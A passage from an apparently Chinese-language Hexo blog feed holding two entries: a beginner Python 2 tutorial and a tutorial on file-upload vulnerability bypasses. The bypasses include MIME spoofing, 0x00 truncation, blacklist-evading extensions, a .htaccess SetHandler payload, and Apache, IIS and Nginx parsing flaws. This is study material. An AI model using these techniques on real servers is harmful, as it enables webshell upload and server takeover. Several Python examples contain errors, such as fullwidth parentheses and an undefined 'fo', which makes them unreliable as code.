class="line"></span><br><span class="line">tup1 = (&apos;physics&apos;, &apos;chemistry&apos;, 1997, 2000)</span><br><span class="line">tup2 = (1, 2, 3, 4, 5, 6, 7 )</span><br><span class="line"></span><br><span class="line">print &quot;tup1[0]: &quot;, tup1[0]</span><br><span class="line">print &quot;tup2[1:5]: &quot;, tup2[1:5]</span><br></pre></td></tr></table></figure></p><h3 id="字典"><a href="#字典" class="headerlink" title="字典 { }"></a>字典 { }</h3><p>字典的每个键值 key=&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中</p><p>键一般是唯一的,值可以取任何数据类型</p><p>访问字典里的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">dict = &#123;&apos;Name&apos;: &apos;Zara&apos;, &apos;Age&apos;: 7, &apos;Class&apos;: &apos;First&apos;&#125;;</span><br><span class="line"></span><br><span class="line">print &quot;dict[&apos;Name&apos;]: &quot;, dict[&apos;Name&apos;];</span><br><span class="line">print &quot;dict[&apos;Age&apos;]: &quot;, dict[&apos;Age&apos;];</span><br></pre></td></tr></table></figure></p><h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><h5 id="读取键盘输入【raw-input-或者input-】"><a href="#读取键盘输入【raw-input-或者input-】" class="headerlink" title="读取键盘输入【raw_input()或者input()】"></a>读取键盘输入【raw_input()或者input()】</h5><p>打开或关闭文件，这里要用Python的内置函数open(),然后创建一个file对象</p><h5 id="python打开文件的模式："><a href="#python打开文件的模式：" class="headerlink" title="python打开文件的模式："></a>python打开文件的模式：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r 以只读模式打开文件</span><br><span class="line">w  以只写模式打开文件，且先把文件内容清空（truncate the file first）wb 以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。</span><br><span class="line">a   以添加模式打开文件，写文件的时候总是写到文件末尾，用seek也无用。打开的文件也是不能读的</span><br><span class="line">r+  以读写方式打开文件，文件可读可写，可写到文件的任何位置</span><br><span class="line">w+ 和r+不同的是，它会truncate the file first</span><br><span class="line">a+ 和r+不同的是，它只能写到文件末尾</span><br></pre></td></tr></table></figure><p>一个文件被打开后，就有一个file对象，可以得到有关该文件的各种信息，以下是一些使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file.closed        返回true如果文件已被关闭，否则返回false。</span><br><span class="line">file.mode        返回被打开文件的访问模式。</span><br><span class="line">file.name        返回文件的名称。</span><br><span class="line">file.softspace        如果用print输出后，必须跟一个空格符，则返回false。否则返回true。</span><br></pre></td></tr></table></figure></p><h5 id="创建一个txt"><a href="#创建一个txt" class="headerlink" title="创建一个txt"></a>创建一个txt</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = open（&quot;first.txt&quot;,&quot;wb&quot;）  #以二进制方式写入文本</span><br><span class="line"></span><br><span class="line">url.close()</span><br></pre></td></tr></table></figure><h5 id="在txt中写入东西"><a href="#在txt中写入东西" class="headerlink" title="在txt中写入东西"></a>在txt中写入东西</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = open（&quot;first.txt&quot;,&quot;wb&quot;）</span><br><span class="line"></span><br><span class="line">url.write(&quot;just do it &quot;)</span><br><span class="line"></span><br><span class="line">url.close()</span><br></pre></td></tr></table></figure><h5 id="读txt里的内容"><a href="#读txt里的内容" class="headerlink" title="读txt里的内容"></a>读txt里的内容</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = open（&quot;first.txt&quot;,“r”）</span><br><span class="line"></span><br><span class="line">url.readlines( )</span><br></pre></td></tr></table></figure><p>Python 文件 readlines() 方法用于读取整个文件（所有行）到一个列表，可以由for… in … 结构进行遍历。列表的每一行变成列表的每一个元素。 </p><p>循环读取文件的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">f = open(&quot;runoob.txt&quot;, &quot;r&quot;)             #打开文件  </span><br><span class="line">print (&quot;文件名为: &quot;, fo.name)</span><br><span class="line"></span><br><span class="line">for line in f.readlines():                     #依次读取每行 </span><br><span class="line">    line = line.strip()                              #去掉每行头尾空白 </span><br><span class="line">    print (&quot;读取的数据为: %s&quot; % (line))</span><br><span class="line"></span><br><span class="line">fo.close()  #关闭文件</span><br></pre></td></tr></table></figure></p><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p>这里使用python的编辑器pycharm练习判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">if &apos;look&apos; is  see&apos;:</span><br><span class="line">        print True</span><br><span class="line">else:</span><br><span class="line">        print False</span><br></pre></td></tr></table></figure></p><p>这个判断为True，因为当判断条件成立时（非零），则执行后面的语句</p><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><h5 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h5><p>while 判断条件：<br>    执行语句……</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line"></span><br><span class="line">port = 1100</span><br><span class="line"></span><br><span class="line">while port &lt; 1109:</span><br><span class="line">        print &quot;The PORT is:&quot;+str(port)</span><br><span class="line">        port = port + 1</span><br></pre></td></tr></table></figure></p><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><p>for  iterating_var  in  sequence:<br>        statements(s)</p><p>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">sum = 0</span><br><span class="line"></span><br><span class="line">for i in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:</span><br><span class="line">        sum = sum + i</span><br><span class="line"></span><br><span class="line">print sum</span><br></pre></td></tr></table></figure></p><p>还可以用range函数生成一个整数数列，来表示较大的数字，比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">sum = 0</span><br><span class="line"></span><br><span class="line">for i in range(101):</span><br><span class="line">        sum = sum +i</span><br><span class="line">print sum</span><br></pre></td></tr></table></figure></p><p>如果循环没有增量，则循环会无限循环下去</p><p>打断循环，在循环过程中，  break语句可以提前退出循环  通过continue语句，跳过当前的这次循环，直接开始下一次循环。</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>文件上传攻击</title>
    <link href="http://yoursite.com/2018/08/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/08/14/文件上传漏洞/</id>
    <published>2018-08-14T14:59:05.000Z</published>
    <updated>2018-08-21T12:52:16.868Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>在网站的运营过程中，不可避免地要对网站的某些页面或者内容 进行更新，这时便需要使用到网站的文件上传的功能。如果不对被上 传的文件进行限制或者限制被绕过，该功能便有可能会被利用于上传 可执行文件、脚本到服务器上，进而进一步导致服务器沦陷。 </p><h1 id="网络渗透的本质-技术部分"><a href="#网络渗透的本质-技术部分" class="headerlink" title="网络渗透的本质(技术部分)"></a>网络渗透的本质(技术部分)</h1><p>主体就是代码注入+代码解析/执行，这种模式贯穿了几乎主流的技术性渗透攻击，像缓冲区溢出攻击，sql 注入攻击，文件上传攻击，文件包含攻击，脚本代码注入等等</p><h1 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h1><p>   导致文件上传的漏洞的原因较多，主要包括以下几类: </p><ol><li>服务器配置不当</li><li>开源编辑器上传漏洞</li><li>本地文件上传限制被绕过 </li><li>过滤不严或被绕过</li><li>文件解析漏洞导致文件执行 </li><li>文件路径截断 </li></ol><h1 id="上传检测流程"><a href="#上传检测流程" class="headerlink" title="上传检测流程"></a>上传检测流程</h1><p><img src="\images\pasted-94.png" alt="upload successful"></p><h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><h3 id="客户端检测绕过-javascript-检测"><a href="#客户端检测绕过-javascript-检测" class="headerlink" title="客户端检测绕过(javascript 检测)"></a>客户端检测绕过(javascript 检测)</h3><p>这类检测通常在上传页面里含有专门检测文件上传的 javascript 代码 最常见的就是检测扩展名是否合法 </p><p>通常post请求发送到web服务器，客户端javascript验证上传1.php弹窗说上传格式错误，只允许.jpg，.jpeg等格式的文件上传一句话1.php–&gt;1.jpg 然后burp抓包1.jpg–&gt;1.php，这样就绕过了js检测</p><h3 id="服务器端检测MIME类型的绕过"><a href="#服务器端检测MIME类型的绕过" class="headerlink" title="服务器端检测MIME类型的绕过"></a>服务器端检测MIME类型的绕过</h3><pre><code>服务端MIME类型检测（检测Content-Type内容），burp抓包，修改Content-TypeContent-Type:text/plain --&gt;phpContent-Type:image/jpeg --&gt;image上传1.jpg---&gt;修改image/jpeg为text/plain，成功绕过。</code></pre><h4 id="常见的MIME类型："><a href="#常见的MIME类型：" class="headerlink" title="常见的MIME类型："></a>常见的MIME类型：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​    超文本标记语言文本 .html text/html 　　</span><br><span class="line"></span><br><span class="line">​    xml文档 .xml text/xml</span><br><span class="line"></span><br><span class="line">​    普通文本 .txt text/plain 　　</span><br><span class="line"></span><br><span class="line">​    RTF文本 .rtf application/rtf 　　</span><br><span class="line"></span><br><span class="line">​    PDF文档 .pdf application/pdf 　　</span><br><span class="line"></span><br><span class="line">​    Microsoft Word文件 .word application/msword 　　</span><br><span class="line"></span><br><span class="line">​    PNG图像 .png image/png 　　</span><br><span class="line"></span><br><span class="line">​    GIF图形 .gif image/gif 　　</span><br><span class="line"></span><br><span class="line">​    JPEG图形 .jpeg,.jpg image/jpeg 　　</span><br><span class="line"></span><br><span class="line">​    au声音文件 .au audio/basic 　　</span><br><span class="line"></span><br><span class="line">​    MIDI音乐文件 mid,.midi audio/midi,audio/x-midi 　　</span><br><span class="line"></span><br><span class="line">​    RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio 　　</span><br><span class="line"></span><br><span class="line">​    MPEG文件 .mpg,.mpeg video/mpeg 　　</span><br><span class="line"></span><br><span class="line">​    AVI文件 .avi video/x-msvideo 　　</span><br><span class="line"></span><br><span class="line">​    GZIP文件 .gz application/x-gzip 　　</span><br><span class="line"></span><br><span class="line">​    TAR文件 .tar application/x-tar 　　</span><br><span class="line"></span><br><span class="line">​    任意的二进制数据 application/octet-stream</span><br></pre></td></tr></table></figure><h3 id="服务器目录路径检测绕过"><a href="#服务器目录路径检测绕过" class="headerlink" title="服务器目录路径检测绕过"></a>服务器目录路径检测绕过</h3><p>目录路径检测，一般就检测路径是否合法，但稍微特殊一点的都没有防御。 </p><p>上传1.jpg,burp进行抓包，Content-Disposition:from-data;name=”path”后面一行upload是我们保存的地址。</p><p>现在我们将upload改为upload/1.php(空格) ，接着我们来到 Proxy-&gt;intercept-&gt;Hex找到1.php(空格)这个被修改   过的代码，找到同一行的数字20，改为00 ，成功绕过</p><h3 id="服务器端黑名单检测绕过"><a href="#服务器端黑名单检测绕过" class="headerlink" title="服务器端黑名单检测绕过"></a>服务器端黑名单检测绕过</h3><p>黑名单的安全性比白名单的安全性低很多，攻击手法自然也比白名单多 一般有个专门的 blacklist 文件</p><h5 id="1-文件名大小写绕过pHp-PhP"><a href="#1-文件名大小写绕过pHp-PhP" class="headerlink" title="1.文件名大小写绕过pHp,PhP"></a>1.文件名大小写绕过pHp,PhP</h5><p>混搭绕过<code>php1,php2,php3,php4,php5，phtml,pht</code> </p><h5 id="2-名单列表绕过"><a href="#2-名单列表绕过" class="headerlink" title="2.名单列表绕过"></a>2.名单列表绕过</h5><p>用黑名单里没有的名单进行攻击， <code>cer,ashx,asa,cer,cdx,htr</code>,绕过(黑名单可能会漏掉的) </p><h5 id="3-特殊文件名绕过"><a href="#3-特殊文件名绕过" class="headerlink" title="3.特殊文件名绕过"></a>3.特殊文件名绕过</h5><p>比如发送的 http 包里把文件名改成 <code>test.asp. 或 test.asp_(下划线为空格)</code>，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。</p><h5 id="4-0x00-截断绕过"><a href="#4-0x00-截断绕过" class="headerlink" title="4.0x00 截断绕过"></a>4.0x00 截断绕过</h5><p>在扩展名检测这一块目前只遇到过 asp 的程序有这种漏洞，给个简单的伪代码<code>name = getname(http request) //</code>假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00)  <code>type = gettype(name) /</code>/而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 <code>jpg  if (type == jpg)SaveFileToPath(UploadPath.name, name)</code> //但在这里却是以 0x00 作为文件名截断                 //最后以 test.asp 存入路径里</p><h5 id="5-htaccess-文件攻击"><a href="#5-htaccess-文件攻击" class="headerlink" title="5..htaccess 文件攻击"></a>5..htaccess 文件攻击</h5><p>配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</p><p>自定义.htaccess上传，下面是内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">​        &lt;FileMatch &quot;aaa&quot;&gt;</span><br><span class="line"></span><br><span class="line">​        SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">​        &lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure><pre><code>同目录下，上传一个aaa文件，没有扩展名，内容是一句话，这个时候就成功绕过。</code></pre><h5 id="6-解析调用-漏洞绕过"><a href="#6-解析调用-漏洞绕过" class="headerlink" title="6.解析调用/漏洞绕过"></a>6.解析调用/漏洞绕过</h5><p>这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p><h3 id="服务器端白名单检测绕过"><a href="#服务器端白名单检测绕过" class="headerlink" title="服务器端白名单检测绕过"></a>服务器端白名单检测绕过</h3><p>白名单相对来说比黑名单安全一些，但也不见得就绝对安全了</p><h5 id="1-0x00-截断绕过"><a href="#1-0x00-截断绕过" class="headerlink" title="1.0x00 截断绕过"></a>1.0x00 截断绕过</h5><p>用像 test.asp%00.jpg 的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑 漏洞进行攻击，目前我只遇到过 asp 的程序有这种漏洞</p><h5 id="2-解析调用-漏洞绕过"><a href="#2-解析调用-漏洞绕过" class="headerlink" title="2.解析调用/漏洞绕过"></a>2.解析调用/漏洞绕过</h5><p>这类漏洞直接配合上传一个代码注入过的白名单文件即可，再利用解析调用/漏洞</p><h5 id="htaccess-文件攻击"><a href="#htaccess-文件攻击" class="headerlink" title=".htaccess 文件攻击"></a>.htaccess 文件攻击</h5><p>无论是黑名单还是白名单</p><p>再直接点就是直接攻击.htaccess 文件</p><p>在 PHP manual 中提到了下面一段话</p><p>move_uploaded_file section, there is a warning which states  ‘If the destination file already exists, it will be overwritten.’  如果 PHP 安全没配置好</p><p>就可以通过 move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的 这样就能任意定义解析名单了</p><h3 id="网络渗透本质：代码注入-代码解析-执行"><a href="#网络渗透本质：代码注入-代码解析-执行" class="headerlink" title="网络渗透本质：代码注入+代码解析/执行"></a>网络渗透本质：代码注入+代码解析/执行</h3><h4 id="主要是两类情况"><a href="#主要是两类情况" class="headerlink" title="主要是两类情况"></a>主要是两类情况</h4><h5 id="1-直接解析-执行攻击"><a href="#1-直接解析-执行攻击" class="headerlink" title="1.直接解析/执行攻击"></a>1.直接解析/执行攻击</h5><p>像缓冲区溢出和 sql 注入攻击，脚本代码注入就是很明显的属于这里攻击 直接将代码注入到一个解析/执行环境里，直接就能让代码得到执行所以危害性也来得最大，效果最明显</p><p>shellcode 注入程序后，直接劫持 EIP，进行该系统环境权限做任何操作</p><p>sql 命令注入数据库后，直接就能执行该数据库账号权限下的任何操作</p><h5 id="2-配合解析-执行攻击"><a href="#2-配合解析-执行攻击" class="headerlink" title="2.配合解析/执行攻击"></a>2.配合解析/执行攻击</h5><p>算是一种组合攻击，在这类情况下</p><p>往往不像第一种情况能拥有直接的解析/执行环境 比较明显的就是我们的上传攻击</p><p>我们需要先上传数据(注入代码)到服务端上去</p><p>然后想办法去调用解析/执行环境(比如 Web 应用程序解析漏洞)  来解析/执行已经注入到了服务端的代码</p><h4 id="三种解析方式"><a href="#三种解析方式" class="headerlink" title="三种解析方式"></a>三种解析方式</h4><h5 id="直接解析"><a href="#直接解析" class="headerlink" title="-直接解析"></a>-直接解析</h5><p>能以 asp,php 之类的扩展名存储在服务器上</p><h5 id="本地文件包含解析"><a href="#本地文件包含解析" class="headerlink" title="-本地文件包含解析"></a>-本地文件包含解析</h5><p>主要是 php 的本地文件包含 (远程文件包含不属于上传攻击绕过范畴)</p><h5 id="htaccess-解析"><a href="#htaccess-解析" class="headerlink" title="-.htaccess 解析"></a>-.htaccess 解析</h5><p>.htaccess 文件 用户自己定义如何去调用解析器解析文件就可以了</p><h3 id="Web应用程序解析漏洞"><a href="#Web应用程序解析漏洞" class="headerlink" title="Web应用程序解析漏洞"></a>Web应用程序解析漏洞</h3><h4 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h4><p>111.php.ddd</p><p>解析 - test.php.任意不属于黑名单且也不属于 Apache 解析白名单的名称</p><p>描述 - 一个文件名为 x1.x2.x3 的文件，Apache 会从 x3 的位置往 x1 的位置开始尝试解析 如果 x3 不属于 Apache 能解析的扩展名，那么 Apache 会尝试去解析 x2 的位置，  从后往前解析，直到遇到一个能解析的扩展名为止</p><h4 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h4><p> 解析 - test.asp/任意文件名 | test.asp;任意文件名 | 任意文件名/任意文件名.php</p><p> IIS6.0 在解析 asp 格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，  那么这个目录下所有的文件都会按照 asp 去解析，另一个是只要文件名中含有”.asp;”  会优先按 asp 来解析</p><p> IIS7.0/7.5 是对 php 解析时有一个类似于 Nginx 的解析漏洞，对任意文件名只要在 URL后面追加上字符串”/任意文件名.php”就会按照 php 的方式去解析</p><h4 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h4><p>解析 - 任意文件名/任意文件名.php | 任意文件名%00.php</p><p>描述 - 目前 Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/任意文件名.php  的解析漏洞，比如原本文件名是 test.jpg，可以添加为 test.jpg/x.php 进行解析攻击。 还有一种是对低版本的 Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。</p><h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3><p><img src="\images\pasted-93.png" alt="upload successful"></p><h3 id="应用层上传漏洞攻击思路"><a href="#应用层上传漏洞攻击思路" class="headerlink" title="应用层上传漏洞攻击思路"></a>应用层上传漏洞攻击思路</h3><p><img src="\images\pasted-92.png" alt="upload successful"></p><h3 id="一个不常见的绕过方式"><a href="#一个不常见的绕过方式" class="headerlink" title="一个不常见的绕过方式"></a>一个不常见的绕过方式</h3><p>文件上传绕过   上传一个php文件，用burp抓包   头部的Content-Type改成Multipart/form-data大小写绕过   请求内容里的Content-Type改成image，文件名改成php5就绕过了</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
